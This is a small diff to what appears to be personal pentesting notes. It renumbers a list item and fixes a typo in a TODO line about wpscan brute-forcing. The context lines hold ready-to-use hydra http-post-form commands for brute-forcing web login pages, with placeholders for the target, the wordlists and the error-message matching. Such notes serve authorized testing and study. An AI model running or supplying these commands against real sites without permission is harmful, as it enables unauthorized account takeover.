@@ -6,9 +6,9 @@ hydra -L logins.txt -P passwords.txt TARGET http-post-form "/path/to/page.php:pa
 2.The site indicates when the password is wrong but the username is good.
 hydra -l LOGIN -P passwords.txt TARGET http-post-form "/path/to/page.php:param_username=^USER^&param_password=^PASS^:ERROR MESSAGE"
 
-1.The site does not indicate when there is an error.
+3.The site does not indicate when there is an error.
 hydra -L logins.txt -P passwords.txt TARGET http-post-form "/path/to/page.php:param_username=^USER^&param_password=^PASS^:NORMAL MESSAGE ON THE PAGE THAT SHOULD NOT BE IN THE NEXT PAGE ONCE CONNECTE"
 
 TODO:
     Find a simple way to have the parameters (curl?).
-    Lok about wpscan bruteforce attack.
+    Look about wpscan bruteforce attack.
